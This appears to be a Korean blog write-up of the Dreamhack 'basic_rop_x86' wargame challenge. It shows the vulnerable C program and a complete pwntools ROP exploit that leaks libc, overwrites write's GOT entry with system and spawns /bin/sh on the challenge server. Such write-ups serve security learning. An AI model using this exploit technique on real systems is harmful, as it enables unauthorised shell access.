---
title: "[Dreamhack] basic_rop_x86 Write up"
author: d0razi
date: 2023-08-16 10:45
categories: [InfoSec, Pwn]
tags: [linux, Dreamhack]
toc: false
image: /assets/img/media/banner/dreamhack.jpg
---

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

read함수에서 취약점이 발생한다. bof를 발생시키고 write함수로 read_got를 출력해서 실제주소를 구한다음에 lib_base를 구한다음 system_got를 알아내서 write_got값을 system_got로 변조시키면 system함수를 호출할 수 있게된다. 그리고 read함수로 bss영역에 `/bin/sh`을 입력하고 `/bin/sh` 을 인자로 system함수를 호출하면 쉘을 딸수 있을꺼 같다.

## 익스플로잇 코드

```python
from pwn import *

#p = process("./basic_rop_x86")
p = remote("host3.dreamhack.games", 10826)
e = ELF("./basic_rop_x86")
libc = ELF("./libc.so.6")

def slog(name, addr):
  return success(": ".join([name, hex(addr)]))

read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
pop3ret = 0x8048689
popret = 0x080483d9
bss = e.bss()

payload = b'A' * 72

#read_got의 실제 주소 출력하기
payload += p32(write_plt) + p32(pop3ret) + p32(1) + p32(read_got) + p32(4)

#bss영역에 /bin/sh 입력하기
payload += p32(read_plt) + p32(pop3ret) + p32(0) + p32(bss) + p32(8)

#write_got system_got로 변조하기
payload += p32(read_plt) + p32(pop3ret) + p32(0) + p32(write_got) +p32(4)

#system으로 바뀐 write호출해서 /bin/sh실행
payload += p32(write_plt) + p32(popret) + p32(bss)

p.send(payload)

p.recvuntil(b'A' * 64)

read = u32(p.recvn(4))
lb = read - read_offset
system = lb + system_offset

slog("libc base", lb)
slog("read", read)
slog("system", system)

p.send(b'/bin/sh\x00')
p.sendline(p32(system))
p.interactive()
```

### 가젯 구하기

![Untitled](/assets/img/media/post_img/dreamhack/basic_rop_x86/Untitled.png)

### 익스코드 확인

![Untitled](/assets/img/media/post_img/dreamhack/basic_rop_x86/Untitled%201.png)